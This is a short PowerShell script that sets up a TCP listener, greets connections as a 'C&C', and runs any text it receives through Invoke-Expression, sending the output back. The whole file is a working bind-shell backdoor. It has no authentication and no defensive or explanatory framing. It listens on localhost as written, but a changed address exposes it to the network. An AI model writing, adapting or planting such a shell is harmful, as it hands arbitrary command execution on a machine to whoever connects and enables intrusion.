# Define IP and Port
$IP = "127.0.0.1"
$Port = 8080

# Create the listener
$listener = New-Object System.Net.Sockets.TcpListener($IP,$Port)
$listener.Start()

# Wait for a connection
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()

# Send a message to the client
$sendbytes = [System.Text.Encoding]::ASCII.GetBytes("Welcome to the C&C")
$stream.Write($sendbytes,0,$sendbytes.Length)

# Receive commands from the client
while ($true) {
    $recvbytes = New-Object byte[] 1024
    $bytes = $stream.Read($recvbytes,0,1024)
    $receivedText = [System.Text.Encoding]::ASCII.GetString($recvbytes,0,$bytes)
    # Execute the command and send the output back to the client
    $output = Invoke-Expression $receivedText
    $sendbytes = [System.Text.Encoding]::ASCII.GetBytes("PS " + (pwd).Path + "> " + $output)
    $stream.Write($sendbytes,0,$sendbytes.Length)
}
